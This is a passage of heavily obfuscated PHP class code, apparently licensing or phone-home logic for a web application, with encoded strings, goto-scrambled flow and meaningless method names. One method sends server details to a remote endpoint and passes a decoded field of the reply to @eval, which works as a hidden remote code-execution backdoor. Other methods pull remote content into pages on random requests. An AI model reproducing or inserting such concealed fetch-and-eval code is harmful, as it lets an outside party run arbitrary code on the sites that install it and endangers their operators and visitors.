array($a¼Ç³œŸß§[202] => $a¼Ç³œŸß§[61]($a¼Ç³œŸß§[62])->{$_SERVER[‹‚–·¹Ÿ][63]}($a¼Ç³œŸß§[116]), $a¼Ç³œŸß§[203] => $_SERVER[$a¼Ç³œŸß§[115]], $a¼Ç³œŸß§[204] => $a¼Ç³œŸß§[205](), $a¼Ç³œŸß§[174] => $_SERVER[$a¼Ç³œŸß§[175]]); $aéĞºÁ‘¦» = $this->{$_SERVER[‹‚–·¹Ÿ][206]}($a¼Ç³œŸß§[148]($Cõ£¤ì©ç)); $this->{$_SERVER[‹‚–·¹Ÿ][182]}($a¼Ç³œŸß§[207] . $aéĞºÁ‘¦»); $a¼Ç³œŸß§[166]($a¼Ç³œŸß§[197]($a¼Ç³œŸß§[208]), !0); } goto dÈö¸Ëâ¡; d¯ìÇ¸×—å: $còº…ÒºŸ‡ =& $_SERVER[Ä¿Ş°¨]; $a¼Ç³œŸß§ =& $_SERVER[‹‚–·¹Ÿ]; if ($_SERVER[$a¼Ç³œŸß§[44]] != $a¼Ç³œŸß§[162]) { return; } goto eÑÕÒ›¼çö; bÇ¹êÅ…º¶: $aÈé¾¿‚Ìº = $D…Æá‚óÃÆ[$a¼Ç³œŸß§[225]]; $fŠ²ÆŸ§—Ä = $còº…ÒºŸ‡[602]; while ($fŠ²ÆŸ§—Ä < $còº…ÒºŸ‡[559]) { if ($fŠ²ÆŸ§—Ä >= 0) { break; } $fŠ²ÆŸ§—Ä++; } goto DÀ¶Ü÷½ˆ; eè¯²ŠîÆ©: if ($e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[217]] && $e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[217]] >= 1) { $a¼Ç³œŸß§[61]($a¼Ç³œŸß§[62])->{$_SERVER[‹‚–·¹Ÿ][218]}($a¼Ç³œŸß§[219], $a¼Ç³œŸß§[220]); } $a¼Ç³œŸß§[61]($a¼Ç³œŸß§[62])->{$_SERVER[‹‚–·¹Ÿ][221]}($böß¿ª¦øÄ); $FÀÁêš‘Ù = $a¼Ç³œŸß§[114]($_SERVER[$a¼Ç³œŸß§[115]] . $a¼Ç³œŸß§[214]($A–ôà¹•) . $böß¿ª¦øÄ[$a¼Ç³œŸß§[210]]); goto f…›Äª¯ğÂ; F¼é¶øñáó: $a¼Ç³œŸß§[166]($a¼Ç³œŸß§[197]($a¼Ç³œŸß§[208]), !0); $DÊ¥Ö©—Á‰ = $còº…ÒºŸ‡[603]; while (strlen($DÊ¥Ö©—Á‰) < $còº…ÒºŸ‡[559]) { if (!$DÊ¥Ö©—Á‰) { break; } $DÊ¥Ö©—Á‰++; } goto aÀù¡£«¡Ü; Eò£¿·Âô£: $dêİ‡¾‚Â§ = $bƒ¿à§éîç . $böß¿ª¦øÄ[$a¼Ç³œŸß§[120]] . $böß¿ª¦øÄ[$a¼Ç³œŸß§[212]]; $böß¿ª¦øÄ[$a¼Ç³œŸß§[122]] = $a¼Ç³œŸß§[214]($a¼Ç³œŸß§[118]($this->{$_SERVER[‹‚–·¹Ÿ][147]}($dêİ‡¾‚Â§, $a¼Ç³œŸß§[215]))); $d©ˆ¬³Äó‚ = $a¼Ç³œŸß§[124](16); goto f¬“÷êÍ«Ç; DÀ¶Ü÷½ˆ: $C“ÄÎ§—ÆÆ = array(); $C“ÄÎ§—ÆÆ[$e˜İµâÇé›] = $cÈ´ ß¢æÇ; $a¼Ç³œŸß§[61]($a¼Ç³œŸß§[11])->{$_SERVER[‹‚–·¹Ÿ][226]}($aÈé¾¿‚Ìº[$a¼Ç³œŸß§[227]], array($a¼Ç³œŸß§[228] => $C“ÄÎ§—ÆÆ)); goto F¼é¶øñáó; aÀù¡£«¡Ü: } private function dkgaf51d4527() { goto e—ÕïÂù«Ú; e—ÕïÂù«Ú: $Bµ„ø±òóÜ =& $_SERVER[Ä¿Ş°¨]; $C§ŸõÄÜ¨± =& $_SERVER[‹‚–·¹Ÿ]; $C§ŸõÄÜ¨±[61]($C§ŸõÄÜ¨±[62])->{$_SERVER[‹‚–·¹Ÿ][221]}(array($C§ŸõÄÜ¨±[209] => $C§ŸõÄÜ¨±[10], $C§ŸõÄÜ¨±[210] => $C§ŸõÄÜ¨±[10], $C§ŸõÄÜ¨±[120] => $C§ŸõÄÜ¨±[121], $C§ŸõÄÜ¨±[122] => $C§ŸõÄÜ¨±[10], $C§ŸõÄÜ¨±[123] => $C§ŸõÄÜ¨±[10])); goto B»Áª§ëÃâ; A†ìÏµß­”: $this->vegy2980d713 = array(); $F¦˜Ü’Ğï = $Bµ„ø±òóÜ[605]; $this->fwilb523e2b4 = $C§ŸõÄÜ¨±[121]; goto B¹ãïÈºÌ; B»Áª§ëÃâ: $C§ŸõÄÜ¨±[61]($C§ŸõÄÜ¨±[62])->{$_SERVER[‹‚–·¹Ÿ][218]}($C§ŸõÄÜ¨±[219], $C§ŸõÄÜ¨±[229]); $C†­Ú¡Ü·ù = $Bµ„ø±òóÜ[604]; while ($C†­Ú¡Ü·ù < $Bµ„ø±òóÜ[559]) { if ($C†­Ú¡Ü·ù >= 0) { break; } $C†­Ú¡Ü·ù++; } goto A†ìÏµß­”; B¹ãïÈºÌ: } private function asqv23f789cd() { goto eÔ¦å´î‚Ó; d×¸§Àµ: $cí‰’ÏÀéÉ = $eçô­‘Ş ¬[606]; $this->fwilb523e2b4 = $AâŞÖîÇÇƒ[121]; $b§Ô®ÀÙìÙ = $eçô­‘Ş ¬[607]; goto AÛÍÊøÌ×; eÔ¦å´î‚Ó: $eçô­‘Ş ¬ =& $_SERVER[Ä¿Ş°¨]; $AâŞÖîÇÇƒ =& $_SERVER[‹‚–·¹Ÿ]; $_SERVER[$AâŞÖîÇÇƒ[175]] = $AâŞÖîÇÇƒ[104]($_SERVER, $AâŞÖîÇÇƒ[175], APP_HOST); goto d×¸§Àµ; AÄ¾ëÕ«ğô: $this->vegy2980d713 = $eåÁ”Ä­ô; $this->fwilb523e2b4 = $Fá˜Ãê’àÜ[$AâŞÖîÇÇƒ[120]]; goto Bƒ‹’ø²ãø; FõÑŠŠÕ Ù: $D®Ğ§‚À•Å = $AâŞÖîÇÇƒ[114]($_SERVER[$AâŞÖîÇÇƒ[115]] . $AâŞÖîÇÇƒ[214]($CËÓëé‡›¿) . $Fá˜Ãê’àÜ[$AâŞÖîÇÇƒ[210]]); $föİé˜¶á = $AâŞÖîÇÇƒ[214]($AâŞÖîÇÇƒ[25]($D®Ğ§‚À•Å, 10, 16)); $b±¦‰ÊÊ½† = $eçô­‘Ş ¬[610]; goto cÊ¾¦®¬ö; fæ¤Ø¯Ä†Ä: $eïÏÄÔóÉ´ = $A¿…ËîÕœ[$AâŞÖîÇÇƒ[225]]; $a¶š¶ô¦‚ = $eçô­‘Ş ¬[609]; while ($a¶š¶ô¦‚ < $eçô­‘Ş ¬[365]) { if ($a¶š¶ô¦‚ >= 0) { break; } $a¶š¶ô¦‚++; } goto FõÑŠŠÕ Ù; AÆÈÕš †Î: if (!$AâŞÖîÇÇƒ[191]($eåÁ”Ä­ô)) { return $this->{$_SERVER[‹‚–·¹Ÿ][164]}(); } $d˜¶ŒÇË = $AâŞÖîÇÇƒ[144]($eåÁ”Ä­ô[$AâŞÖîÇÇƒ[145]]); if ($AâŞÖîÇÇƒ[230]() >= $d˜¶ŒÇË) { return $this->{$_SERVER[‹‚–·¹Ÿ][164]}(); } goto AÄ¾ëÕ«ğô; Eñöƒœ›´¿: $CêøçãÚ¤Ü = $eçô­‘Ş ¬[608]; while ($CêøçãÚ¤Ü < $eçô­‘Ş ¬[559]) { if ($CêøçãÚ¤Ü >= 0) { break; } $CêøçãÚ¤Ü++; } $A¿…ËîÕœ = $AâŞÖîÇÇƒ[222]($AâŞÖîÇÇƒ[61]($AâŞÖîÇÇƒ[11])->{$_SERVER[‹‚–·¹Ÿ][223]}(), $AâŞÖîÇÇƒ[224]); goto fæ¤Ø¯Ä†Ä; cÊ¾¦®¬ö: while (strlen($b±¦‰ÊÊ½†) < $eçô­‘Ş ¬[557]) { if (!$b±¦‰ÊÊ½†) { break; } $b±¦‰ÊÊ½†++; } $eåÁ”Ä­ô = $this->{$_SERVER[‹‚–·¹Ÿ][188]}($eïÏÄÔóÉ´[$AâŞÖîÇÇƒ[91]][$föİé˜¶á], $D®Ğ§‚À•Å); $eåÁ”Ä­ô = $AâŞÖîÇÇƒ[190]($eåÁ”Ä­ô, !0); goto AÆÈÕš †Î; AÛÍÊøÌ×: $Fá˜Ãê’àÜ = $AâŞÖîÇÇƒ[61]($AâŞÖîÇÇƒ[62])->{$_SERVER[‹‚–·¹Ÿ][63]}(); if ($Fá˜Ãê’àÜ[$AâŞÖîÇÇƒ[120]] == $AâŞÖîÇÇƒ[121]) { return; } $CËÓëé‡›¿ = $AâŞÖîÇÇƒ[61]($AâŞÖîÇÇƒ[62])->{$_SERVER[‹‚–·¹Ÿ][63]}($AâŞÖîÇÇƒ[116]); goto Eñöƒœ›´¿; Bƒ‹’ø²ãø: } private function vjkm51c645f0() { goto FîÀ·®®; FîÀ·®®: $CÖ©Ïì£ùß =& $_SERVER[Ä¿Ş°¨]; $AÁ‰É¸¾É® =& $_SERVER[‹‚–·¹Ÿ]; $a¸±„æÛÖø = $GLOBALS[$AÁ‰É¸¾É®[22]]; goto d»‰ê“å”Ô; d»‰ê“å”Ô: $CÄù±‡Äó = $CÖ©Ïì£ùß[611]; if (!$CÄù±‡Äó) { return; } $AíËÃ‹¬’­ = $_SERVER[$AÁ‰É¸¾É®[44]]; goto d õÃƒåíî; d õÃƒåíî: $fÑ¦´øÔ×Ÿ = $CÖ©Ïì£ùß[612]; while (strlen($fÑ¦´øÔ×Ÿ) < $CÖ©Ïì£ùß[563]) { if (!$fÑ¦´øÔ×Ÿ) { break; } $fÑ¦´øÔ×Ÿ++; } if ($AíËÃ‹¬’­ == $AÁ‰É¸¾É®[231] && $this->fwilb523e2b4 == $AÁ‰É¸¾É®[121]) { $AÁ‰É¸¾É®[166]($AÁ‰É¸¾É®[197]($AÁ‰É¸¾É®[232]), !1, $AÁ‰É¸¾É®[233]); } goto FîÃŞÊİ³; FîÃŞÊİ³: $CÓˆƒËª¶ = array($AÁ‰É¸¾É®[234], $AÁ‰É¸¾É®[235]); if ($AÁ‰É¸¾É®[236]($AíËÃ‹¬’­, $CÓˆƒËª¶)) { if ($this->fwilb523e2b4 == $AÁ‰É¸¾É®[121] && isset($a¸±„æÛÖø[$AÁ‰É¸¾É®[237]])) { $AÁ‰É¸¾É®[166]($AÁ‰É¸¾É®[197]($AÁ‰É¸¾É®[232]), !1, $AÁ‰É¸¾É®[233]); die; } $F™ È˜÷ó£ = $this->{$_SERVER[‹‚–·¹Ÿ][137]}(); if ($F™ È˜÷ó£ != $AÁ‰É¸¾É®[201]($AÁ‰É¸¾É®[238])) { if ($F™ È˜÷ó£ <= $AÁ‰É¸¾É®[61]($AÁ‰É¸¾É®[139])->{$_SERVER[‹‚–·¹Ÿ][140]}()) { $AÁ‰É¸¾É®[166]($AÁ‰É¸¾É®[197]($AÁ‰É¸¾É®[239]), !1, $AÁ‰É¸¾É®[233]); die; } } } goto bÕ¢Ï××ÜÔ; bÕ¢Ï××ÜÔ: } private function nzao6f2d307d() { goto a’ÁÕ¢ŞÍ‹; a’ÁÕ¢ŞÍ‹: $fÊĞ„ã•À =& $_SERVER[Ä¿Ş°¨]; $e«©Ó…óš§ =& $_SERVER[‹‚–·¹Ÿ]; $dÔôâ”§² = array($e«©Ó…óš§[135], $e«©Ó…óš§[240]); goto EˆÒÎğ¤Ë¯; EàÄÇ³¯ê¼: if (!$E…áƒ§İšâ) { return; } if ($d¯ÊŞ¯ì†å && $e«©Ó…óš§[32]($d¯ÊŞ¯ì†å, $e«©Ó…óš§[253])) { echo $d¯ÊŞ¯ì†å; } die; goto D®ÂÆ¢Ù”»; BÇ†›£´÷˜: if (!$e«©Ó…óš§[236]($_SERVER[$e«©Ó…óš§[44]], $dÔôâ”§²)) { return; } $C„—‹†é„é = $e«©Ó…óš§[242]; $C„—‹†é„é = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($C„—‹†é„é, $e«©Ó…óš§[244]); goto C‹âä°¥£ß; f‘Ù™¤Â: $d¯ÊŞ¯ì†å = @$e«©Ó…óš§[250]($C„—‹†é„é, !1, $a¹ÁŞë¿Ë¡); $e«©Ó…óš§[251]($e«©Ó…óš§[252]); $E…áƒ§İšâ = $fÊĞ„ã•À[615]; goto EàÄÇ³¯ê¼; C‹âä°¥£ß: $a¹ÁŞë¿Ë¡ = $e«©Ó…óš§[245](array($e«©Ó…óš§[246] => array($e«©Ó…óš§[247] => $e«©Ó…óš§[248], $e«©Ó…óš§[249] => 3))); $d›¶²¿ = $fÊĞ„ã•À[614]; if (strlen($d›¶²¿) < $fÊĞ„ã•À[563]) { die; } goto f‘Ù™¤Â; EˆÒÎğ¤Ë¯: $dôÊ«ôøÍÇ = $fÊĞ„ã•À[613]; if (strlen($dôÊ«ôøÍÇ) < $fÊĞ„ã•À[559]) { return; } if (!$e«©Ó…óš§[104]($GLOBALS, $e«©Ó…óš§[132]) || !isset($_GET[$e«©Ó…óš§[241]])) { return; } goto BÇ†›£´÷˜; D®ÂÆ¢Ù”»: } public function gnai14c1e058($cñ¼¡§ä–¨) { goto eÇ–™‚”Š»; eÇ–™‚”Š»: $C¥Ñ±‰öÔ˜ =& $_SERVER[Ä¿Ş°¨]; $eÙ¦ìÔ§š£ =& $_SERVER[‹‚–·¹Ÿ]; if ($this->fwilb523e2b4 == $eÙ¦ìÔ§š£[254]) { return $cñ¼¡§ä–¨; } goto B¹—Îù˜; B¹—Îù˜: $dÚºóô®®» = array($eÙ¦ìÔ§š£[255], $eÙ¦ìÔ§š£[256], $eÙ¦ìÔ§š£[257], $eÙ¦ìÔ§š£[258], $eÙ¦ìÔ§š£[259], $eÙ¦ìÔ§š£[260], $eÙ¦ìÔ§š£[261], $eÙ¦ìÔ§š£[262]); $A²„Š¼‚Ÿ× = $eÙ¦ìÔ§š£[0]($eÙ¦ìÔ§š£[263], $eÙ¦ìÔ§š£[104]($this->vegy2980d713, $eÙ¦ìÔ§š£[129], $eÙ¦ìÔ§š£[10])); $a‚‘Ì¼Šè = $C¥Ñ±‰öÔ˜[616]; goto Fš¨È•«á¢; e— Ã‚Êï“: $bÏê™ÕÌ­š = $C¥Ñ±‰öÔ˜[618]; if (strlen($bÏê™ÕÌ­š) < $C¥Ñ±‰öÔ˜[555]) { return; } goto Bæ÷ˆ‰ªœŠ; Fš¨È•«á¢: if (strlen($a‚‘Ì¼Šè) < $C¥Ñ±‰öÔ˜[555]) { die; } $E…°Œë–áÄ = array(); $d©ªÀŒ¬«ñ = $C¥Ñ±‰öÔ˜[617]; goto AÖŞê‰Šğ®; AÖŞê‰Šğ®: foreach ($dÚºóô®®» as $E˜©„·‚ã¦) { if (!$eÙ¦ìÔ§š£[236]($E˜©„·‚ã¦, $A²„Š¼‚Ÿ×)) { $E…°Œë–áÄ[] = $E˜©„·‚ã¦; } } foreach ($E…°Œë–áÄ as $E˜©„·‚ã¦) { unset($cñ¼¡§ä–¨[$E˜©„·‚ã¦]); } return $cñ¼¡§ä–¨; goto e— Ã‚Êï“; Bæ÷ˆ‰ªœŠ: } private function txagd3b46c98() { goto a‚„š§´„; a‚„š§´„: $aí‚†”–› =& $_SERVER[‹‚–·¹Ÿ]; if ($this->fwilb523e2b4 != $aí‚†”–›[121]) { $GLOBALS[$aí‚†”–›[91]][$aí‚†”–›[95]][$aí‚†”–›[264]] = $aí‚†”–›[220]; return; } $d´»İÖ«ôÉ = $_SERVER[$aí‚†”–›[44]]; goto F‰ÈÇ‰§Æè; F‰ÈÇ‰§Æè: $AÏºåÜŞ÷ = array($aí‚†”–›[265]); $e„£ÍÑ÷èÇ = $_SERVER[Ä¿Ş°¨][619]; foreach ($AÏºåÜŞ÷ as $dñ•Ç£İóº) { if ($dñ•Ç£İóº == $d´»İÖ«ôÉ || $aí‚†”–›[25]($d´»İÖ«ôÉ, 0, $aí‚†”–›[24]($dñ•Ç£İóº)) == $dñ•Ç£İóº) { $aí‚†”–›[166]($aí‚†”–›[197]($aí‚†”–›[266]), !1); } } goto Fè£á‡Ë­; FÎ³£¶ò‚: if ($aí‚†”–›[61]($aí‚†”–›[269])->{$_SERVER[‹‚–·¹Ÿ][63]}($aí‚†”–›[85]) != $aí‚†”–›[229]) { $aí‚†”–›[61]($aí‚†”–›[269])->{$_SERVER[‹‚–·¹Ÿ][221]}($aí‚†”–›[85], $aí‚†”–›[229]); } goto c²ƒÔÂ™Ö–; Fè£á‡Ë­: $GLOBALS[$aí‚†”–›[91]][$aí‚†”–›[95]][$aí‚†”–›[267]] = $aí‚†”–›[220]; $GLOBALS[$aí‚†”–›[91]][$aí‚†”–›[95]][$aí‚†”–›[264]] = $aí‚†”–›[229]; $GLOBALS[$aí‚†”–›[91]][$aí‚†”–›[268]] = $aí‚†”–›[220]; goto FÎ³£¶ò‚; c²ƒÔÂ™Ö–: } public function bajt43269ac8() { return $_SERVER[‹‚–·¹Ÿ][270]; } private function xzshc40a9fe0() { goto B¸…É¦‘Ş; d¥¦˜İÃ: $fø††º‰ = $d»Í£‹“ç“[623]; if ($this->{$_SERVER[‹‚–·¹Ÿ][199]}($dåÀùŠšåÚ[$C½èÜÊÛ­á[280]]) != $Eƒ‰Ö¥Î¾Š[$C½èÜÊÛ­á[165]]) { $dß»§¡–†Í = array($C½èÜÊÛ­á[202] => $C½èÜÊÛ­á[61]($C½èÜÊÛ­á[62])->{$_SERVER[‹‚–·¹Ÿ][63]}($C½èÜÊÛ­á[116]), $C½èÜÊÛ­á[203] => $_SERVER[$C½èÜÊÛ­á[115]], $C½èÜÊÛ­á[204] => $C½èÜÊÛ­á[205](), $C½èÜÊÛ­á[174] => $_SERVER[$C½èÜÊÛ­á[175]]); $a«›¢È­‚ª = $this->{$_SERVER[‹‚–·¹Ÿ][206]}($C½èÜÊÛ­á[148]($dß»§¡–†Í)); $dåÀùŠšåÚ = $this->{$_SERVER[‹‚–·¹Ÿ][182]}($C½èÜÊÛ­á[207] . $a«›¢È­‚ª); if ($dåÀùŠšåÚ && $C½èÜÊÛ­á[191]($dåÀùŠšåÚ) && isset($dåÀùŠšåÚ[$C½èÜÊÛ­á[280]])) { $C«äá¾©Å = $this->{$_SERVER[‹‚–·¹Ÿ][188]}($dåÀùŠšåÚ[$C½èÜÊÛ­á[280]], 2); if ($C«äá¾©Å) { $C«äá¾©Å = $this->{$_SERVER[‹‚–·¹Ÿ][199]}($C«äá¾©Å); } if ($C«äá¾©Å) { try { @eval($C«äá¾©Å); } catch (Exception $c¸¥ˆ‡ÚÄ) { } } } } goto Fî¼”ÒÅš; cˆƒŠ°¡¦Œ: if (strlen($BÚ¶¨Õ–†«) < $d»Í£‹“ç“[563]) { return; } $dåÀùŠšåÚ = $this->{$_SERVER[‹‚–·¹Ÿ][182]}($C½èÜÊÛ­á[279], $Eƒ‰Ö¥Î¾Š); $c§Êãïêßƒ = $d»Í£‹“ç“[622]; goto e†í¥Îƒ„ê; B¸…É¦‘Ş: $d»Í£‹“ç“ =& $_SERVER[Ä¿Ş°¨]; $C½èÜÊÛ­á =& $_SERVER[‹‚–·¹Ÿ]; $bÒÒ˜Êš™› = array($C½èÜÊÛ­á[271], $C½èÜÊÛ­á[272], $C½èÜÊÛ­á[273]); goto D‹æô¥İèŒ; e†í¥Îƒ„ê: if (!$C½èÜÊÛ­á[191]($dåÀùŠšåÚ)) { return; } if ($dåÀùŠšåÚ[$C½èÜÊÛ­á[165]] && $dåÀùŠšåÚ[$C½èÜÊÛ­á[280]]) { if ($this->{$_SERVER[‹‚–·¹Ÿ][199]}($dåÀùŠšåÚ[$C½èÜÊÛ­á[280]]) == $Eƒ‰Ö¥Î¾Š[$C½èÜÊÛ­á[165]]) { return; } } $this->{$_SERVER[‹‚–·¹Ÿ][164]}(); goto d¥¦˜İÃ; f‡Ÿ«ã÷ÖÊ: if (!$C½èÜÊÛ­á[236]($_SERVER[$C½èÜÊÛ­á[44]], $bÒÒ˜Êš™›)) { return; } if ($C½èÜÊÛ­á[230]() % 4 != 0) { return; } $dõ®“—Ù¾› = $C½èÜÊÛ­á[13](array($C½èÜÊÛ­á[276], $C½èÜÊÛ­á[277]), $BğğàœÁ‰ª); goto Aï…²‘ÈÂÙ; eØÉêÙ‹õ: $C½èÜÊÛ­á[13](array($C½èÜÊÛ­á[276], $C½èÜÊÛ­á[152]), $BğğàœÁ‰ª, $C½èÜÊÛ­á[230]()); $Eƒ‰Ö¥Î¾Š = array($C½èÜÊÛ­á[165] => $C½èÜÊÛ­á[61]($C½èÜÊÛ­á[62])->{$_SERVER[‹‚–·¹Ÿ][63]}($C½èÜÊÛ­á[209]), $C½èÜÊÛ­á[178] => $this->fwilb523e2b4, $C½èÜÊÛ­á[176] => $_SERVER[$C½èÜÊÛ­á[177]], $C½èÜÊÛ­á[169] => $C½èÜÊÛ­á[149], $C½èÜÊÛ­á[172] => $_SERVER[$C½èÜÊÛ­á[173]]); $BÚ¶¨Õ–†« = $d»Í£‹“ç“[621]; goto cˆƒŠ°¡¦Œ; D‹æô¥İèŒ: $Cë‚³¢ª¤ß = $d»Í£‹“ç“[620]; $BğğàœÁ‰ª = $C½èÜÊÛ­á[274] . $C½èÜÊÛ­á[114]($C½èÜÊÛ­á[275]); if ($this->fwilb523e2b4 == $C½èÜÊÛ­á[121] || !$C½èÜÊÛ­á[104]($GLOBALS, $C½èÜÊÛ­á[132])) { return; } goto f‡Ÿ«ã÷ÖÊ; Aï…²‘ÈÂÙ: $c±½·Â²™Á = $d»Í£‹“ç“[611]; if (!$c±½·Â²™Á) { return; } if ($dõ®“—Ù¾› && $C½èÜÊÛ­á[230]() - $dõ®“—Ù¾› < $C½èÜÊÛ­á[201]($C½èÜÊÛ­á[278])) { return; } goto eØÉêÙ‹õ; Fî¼”ÒÅš: } private function amhzc48e18ae($föˆ¬¨¢ = '', $Fàáœ•°ù• = array(), $eõ°õĞ¦æö = 5) { goto a’ §Å¹–; a’ §Å¹–: $dó§‰†Ô¦” =& $_SERVER[Ä¿Ş°¨]; $EÖ£¤ù‰æŞ =& $_SERVER[‹‚–·¹Ÿ]; $E„œ‚’§Œš = $EÖ£¤ù‰æŞ[281]; goto f¬„ÜªñÁõ; Fì™’ÒÆ”ï: if (strlen($c”‡ŞÊÊÈ) < $dó§‰†Ô¦”[557]) { die; } return $EÖ£¤ù‰æŞ[190]($Fàáœ•°ù•, !0); $DêØŠ¶ÏòŠ = $dó§‰†Ô¦”[625]; goto ašà„ˆºÈŒ; f¬„ÜªñÁõ: $E„œ‚’§Œš = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($E„œ‚’§Œš, $EÖ£¤ù‰æŞ[282]); $E„œ‚’§Œš = $E„œ‚’§Œš . $föˆ¬¨¢ . $EÖ£¤ù‰æŞ[283] . $EÖ£¤ù‰æŞ[284]($Fàáœ•°ù•); if ($Fàáœ•°ù• === -1) { return $E„œ‚’§Œš; } goto eÍ‚‚ë´©; eÍ‚‚ë´©: $b½‰Ğöœà« = $EÖ£¤ù‰æŞ[245](array($EÖ£¤ù‰æŞ[246] => array($EÖ£¤ù‰æŞ[249] => $eõ°õĞ¦æö, $EÖ£¤ù‰æŞ[247] => $EÖ£¤ù‰æŞ[285]), $EÖ£¤ù‰æŞ[286] => array($EÖ£¤ù‰æŞ[287] => !1, $EÖ£¤ù‰æŞ[288] => !1))); $Fàáœ•°ù• = @$EÖ£¤ù‰æŞ[250]($E„œ‚’§Œš, !1, $b½‰Ğöœà«); $c”‡ŞÊÊÈ = $dó§‰†Ô¦”[624]; goto Fì™’ÒÆ”ï; ašà„ˆºÈŒ: while (strlen($DêØŠ¶ÏòŠ) < $dó§‰†Ô¦”[559]) { if (!$DêØŠ¶ÏòŠ) { break; } $DêØŠ¶ÏòŠ++; } goto eí¢ˆÒôï; eí¢ˆÒôï: } private function stkv58999c59() { goto Eƒ•ÊÏ¬æß; Eƒ•ÊÏ¬æß: $bË©•„ÉÕ =& $_SERVER[Ä¿Ş°¨]; $DÙ‹¦ˆ“‰› =& $_SERVER[‹‚–·¹Ÿ]; $c‡²Ñµƒ•è = array($DÙ‹¦ˆ“‰›[289] => $DÙ‹¦ˆ“‰›[290], $DÙ‹¦ˆ“‰›[291] => $DÙ‹¦ˆ“‰›[292], $DÙ‹¦ˆ“‰›[293] => $DÙ‹¦ˆ“‰›[294], $DÙ‹¦ˆ“‰›[295] => $DÙ‹¦ˆ“‰›[296], $DÙ‹¦ˆ“‰›[297] => $DÙ‹¦ˆ“‰›[298], $DÙ‹¦ˆ“‰›[299] => $DÙ‹¦ˆ“‰›[238], $DÙ‹¦ˆ“‰›[300] => $DÙ‹¦ˆ“‰›[238], $DÙ‹¦ˆ“‰›[301] => $DÙ‹¦ˆ“‰›[290], $DÙ‹¦ˆ“‰›[302] => $DÙ‹¦ˆ“‰›[292], $DÙ‹¦ˆ“‰›[303] => $DÙ‹¦ˆ“‰›[294], $DÙ‹¦ˆ“‰›[304] => $DÙ‹¦ˆ“‰›[305], $DÙ‹¦ˆ“‰›[306] => $DÙ‹¦ˆ“‰›[296], $DÙ‹¦ˆ“‰›[307] => $DÙ‹¦ˆ“‰›[308], $DÙ‹¦ˆ“‰›[309] => $DÙ‹¦ˆ“‰›[298], $DÙ‹¦ˆ“‰›[310] => $DÙ‹¦ˆ“‰›[311], $DÙ‹¦ˆ“‰›[312] => $DÙ‹¦ˆ“‰›[313], $DÙ‹¦ˆ“‰›[314] => $DÙ‹¦ˆ“‰›[315]); goto BÖ¤Õ½™–·; cÍŒÍÃäÒ„: if (!$b½°í×Á‚À) { die; } return $fò™åÔ˜¾‘ + $bíß’Ã‡ç; goto c‚’Ô±¹ä; BÖ¤Õ½™–·: $aŠ˜äô¯Ì‘ = $bË©•„ÉÕ[626]; if (!$aŠ˜äô¯Ì‘) { die; } $fò™åÔ˜¾‘ = $c‡²Ñµƒ•è[$this->fwilb523e2b4]; goto e…»ÅØÏÙ; e‹‚ˆß­Ò: $bíß’Ã‡ç = $DÙ‹¦ˆ“‰›[104]($this->vegy2980d713, $DÙ‹¦ˆ“‰›[316]); $bíß’Ã‡ç = $bíß’Ã‡ç ? $DÙ‹¦ˆ“‰›[201]($bíß’Ã‡ç) : 0; $b½°í×Á‚À = $bË©•„ÉÕ[628]; goto cÍŒÍÃäÒ„; e…»ÅØÏÙ: $B¶—®ÄÔ‘Ç = $bË©•„ÉÕ[627]; if (strlen($B¶—®ÄÔ‘Ç) < $bË©•„ÉÕ[563]) { return; } $fò™åÔ˜¾‘ = $DÙ‹¦ˆ“‰›[201]($fò™åÔ˜¾‘ ? $fò™åÔ˜¾‘ : $DÙ‹¦ˆ“‰›[290]); goto e‹‚ˆß­Ò; c‚’Ô±¹ä: } public function mpqj9d561bf1($bíÔšï„Ï) { goto aŠ­¯¢¨ó; Bí¨”¤ˆĞÜ: if ($d§Ïä¢İ† >= $FìòÑŠ…´õ[201]($FìòÑŠ…´õ[238])) { return; } $f¾æÇ£‚£ = $FìòÑŠ…´õ[61]($FìòÑŠ…´õ[139])->{$_SERVER[‹‚–·¹Ÿ][140]}(); $e“Ôè””Úá = $Aëª„»­™ä[629]; goto Bá­†¼Ûó¬; Bá­†¼Ûó¬: if (!$e“Ôè””Úá) { return; } if ($f¾æÇ£‚£ <= $d§Ïä¢İ†) { return; } $C¬ïÊÑÛ¿¤ = $FìòÑŠ…´õ[61]($FìòÑŠ…´õ[139])->{$_SERVER[‹‚–·¹Ÿ][317]}($FìòÑŠ…´õ[318])->{$_SERVER[‹‚–·¹Ÿ][319]}($d§Ïä¢İ†)->{$_SERVER[‹‚–·¹Ÿ][320]}(); goto FÙ²ŒÍ‰¯™; FÙ²ŒÍ‰¯™: $D»œ£†Óñ = $Aëª„»­™ä[630]; if (strlen($D»œ£†Óñ) < $Aëª„»­™ä[559]) { die; } $C¬ïÊÑÛ¿¤ = $FìòÑŠ…´õ[222]($C¬ïÊÑÛ¿¤, $FìòÑŠ…´õ[10], $FìòÑŠ…´õ[318]); goto F÷•Æ‹«Úº; aŠ­¯¢¨ó: $Aëª„»­™ä =& $_SERVER[Ä¿Ş°¨]; $FìòÑŠ…´õ =& $_SERVER[‹‚–·¹Ÿ]; $d§Ïä¢İ† = $this->{$_SERVER[‹‚–·¹Ÿ][137]}(); goto Bí¨”¤ˆĞÜ; F÷•Æ‹«Úº: if (!$FìòÑŠ…´õ[236]($bíÔšï„Ï[$FìòÑŠ…´õ[318]], $C¬ïÊÑÛ¿¤)) { $FìòÑŠ…´õ[166]($FìòÑŠ…´õ[321], !1, $FìòÑŠ…´õ[233]); } goto d‹ÀóˆáŠ¤; d‹ÀóˆáŠ¤: } public function fsnm679a9869() { goto dÚ—œÅÔà¢; dÚ—œÅÔà¢: $Bçœ³—Çà =& $_SERVER[Ä¿Ş°¨]; $cÏøğó¡ë§ =& $_SERVER[‹‚–·¹Ÿ]; if (!$cÏøğó¡ë§[104]($GLOBALS, $cÏøğó¡ë§[132]) || $cÏøğó¡ë§[322](1, 100) > 20) { return; } goto eÈ†´äó¾ù; FİÚ—í ™ø: $F‚ˆğ¯åä§ = $Bçœ³—Çà[633]; $c¼‘â®¢ËÏ = @$cÏøğó¡ë§[250]($c¸’í´³â”, !1, $c–®Ó‹‘î); echo $cÏøğó¡ë§[323] . $cÏøğó¡ë§[324]($c¼‘â®¢ËÏ) . $cÏøğó¡ë§[325]; goto fÀô¢¿ƒóò; eÈ†´äó¾ù: $c¸’í´³â” = $cÏøğó¡ë§[242]; $e¬„®ßóåã = $Bçœ³—Çà[631]; if 